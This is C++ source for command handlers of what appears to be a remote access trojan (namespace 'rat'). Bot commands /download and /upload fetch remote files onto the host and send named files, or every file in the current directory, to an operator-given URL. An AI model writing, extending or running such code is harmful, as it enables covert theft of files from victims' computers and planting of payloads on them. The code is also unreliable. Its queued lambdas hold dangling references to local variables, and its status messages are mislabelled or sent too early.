#include "rat/Handler.hpp"
#include "rat/system.hpp"
#include <chrono>
#include <mutex>
#include <sstream>
#include <filesystem>
#include <thread>
#include "logging.hpp"

namespace rat::handler {

void Handler::handleDownloadCommand() {
    if (this->command.parameters.empty()) {
        this->bot->sendMessage("Usage: /download <url> [path]");
        return;
    }
    const auto& params = this->command.parameters;
    const size_t number_params = params.size();
    const std::string& url = params[0];
    this->process_pool->enqueue([this, &url, &params, &number_params] () {
        
        std::lock_guard<std::mutex> curl_client_lock(this->curl_client_mutex);
        std::lock_guard<std::mutex> backing_bot_lock(this->backing_bot_mutex);
        switch (number_params) {
            case 1: {
                if(this->curl_client->download(url)) {

                }
                break;
            }
            case 2: {
                const std::filesystem::path path(params[1]);

                if (std::filesystem::exists(path) && std::filesystem::is_directory(path)) {
                    const auto file_path = path / rat::networking::_getFilePathFromUrl(url);
                    this->curl_client->download(url, file_path);
                } else {
                    if (std::filesystem::exists(path)) {
                        this->backing_bot->sendMessage(fmt::format("Warning: overwriting the file {}", path.string()));
                    }
                    
                    if (this->curl_client->download(url, path)) {
                        this->backing_bot->sendMessage(fmt::format("The file was downloaded: {}", path.string())); 
                    }else {
                        this->backing_bot->sendMessage(fmt::format("This file failed to download {}", path.string() ) );
                    }
                }
                break;
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    });
}

void Handler::handleUploadCommand() {
    if (this->command.parameters.size() < 2) {
        this->bot->sendMessage("Usage: /upload <filepaths...> <url>");
        return;
    }

    std::string url = std::move(this->command.parameters.back());
    this->command.parameters.pop_back(); // remove it from parameters

    std::vector<std::string> paths = std::move(this->command.parameters);

    // Handle "*" meaning all files in current directory
    if (paths.size() == 1 && paths[0] == "*") {
        std::vector<std::filesystem::path> real_paths;

        for (const auto& entry : std::filesystem::directory_iterator(std::filesystem::current_path())) {
            if (std::filesystem::is_regular_file(entry.status())) {
                real_paths.push_back(entry.path());
            }
        }
        if (real_paths.empty()) {
            this->bot->sendMessage("No files found in current directory.");
            return;
        }
        this->process_pool->enqueue([this, &real_paths, &url]() {
            
            std::unique_lock<std::mutex> curl_client_lock(this->curl_client_mutex);
            std::unique_lock<std::mutex> backing_bot_lock(this->backing_bot_mutex);
            
            
            for (const auto& file_path : real_paths) {
                if(this->curl_client->upload(file_path, url) ) {
                    this->backing_bot->sendMessage(fmt::format("File {} downloaded ", file_path.string())); 
                }else {
                    this->backing_bot->sendMessage(fmt::format("File {} failed to download", file_path.string()));
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(1));
        });
    } else {
        for (auto& p : paths) {
            std::filesystem::path file_path(std::move(p));

            if (!std::filesystem::exists(file_path)) {
                this->backing_bot->sendMessage(fmt::format("File does not exist: {}", file_path.string()));
                continue;
            }
            if (std::filesystem::is_directory(file_path)) {
                this->backing_bot->sendMessage(fmt::format("Skipping directory: {}", file_path.string()));
                continue;
            }
            this->process_pool->enqueue([this, &file_path, &url]() {
                    
                std::unique_lock<std::mutex> curl_client_lock(this->curl_client_mutex);
                std::unique_lock<std::mutex> backing_bot_lock(this->backing_bot_mutex);
                
                if(this->curl_client->upload(file_path, url)) {
                    this->backing_bot->sendMessage(fmt::format("File {} uploaded to {}", file_path.string(), url));
                }else {
                    this->backing_bot->sendMessage((fmt::format("File {} failed to upload to {}", file_path.string(), url)));
                }
                
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            });

        }
    }
    this->backing_bot->sendMessage("Upload complete.");
}

} // namespace rat::handler
